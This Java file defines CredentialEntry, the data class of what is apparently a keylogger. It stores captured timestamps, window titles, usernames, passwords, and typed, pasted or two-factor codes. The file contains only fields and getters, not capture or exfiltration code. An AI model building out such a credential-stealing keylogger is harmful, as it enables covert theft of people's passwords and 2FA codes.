package keylogger;

/**
 * Snapshot of a detected credential event.
 * type is one of: TYPED | CLIPBOARD_PASTE | 2FA_CODE
 */
public class CredentialEntry {

    private final String timestamp;
    private final String window;
    private final String username;   // null when no TAB-field transition detected
    private final String password;
    private final String type;

    public CredentialEntry(String timestamp, String window,
                           String username, String password, String type) {
        this.timestamp = timestamp;
        this.window    = window;
        this.username  = username;
        this.password  = password;
        this.type      = type;
    }

    public String getTimestamp() { return timestamp; }
    public String getWindow()    { return window; }
    public String getUsername()  { return username; }
    public String getPassword()  { return password; }
    public String getType()      { return type; }
}
